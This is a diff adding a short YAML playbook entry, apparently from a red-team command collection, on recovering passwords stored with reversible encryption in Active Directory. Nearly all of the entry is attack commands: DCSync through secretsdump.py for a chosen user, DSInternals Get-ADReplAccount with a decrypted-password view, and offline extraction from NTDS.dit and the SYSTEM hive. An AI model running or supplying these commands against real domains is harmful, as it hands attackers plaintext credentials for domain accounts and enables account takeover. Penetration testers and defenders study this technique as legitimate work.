@@ -1,0 +1,13 @@
+name: ReversibleEncryption
+description: Reversible encryption stores recoverable plaintext - extract via DCSync or NTDS.dit
+commands:
+- '# DCSync specific user (requires replication rights)'
+- secretsdump.py -just-dc-user <USER> '<DOMAIN>/<ADMIN>@<DC>'
+- ''
+- '# DSInternals (PowerShell) - from DC or with DCSync'
+- Get-ADReplAccount -SamAccountName '<USER>' -Server <DC> | Format-Custom -View DecryptedPassword
+- ''
+- '# From NTDS.dit offline'
+- secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile extracted
+opsec: []
+references: []
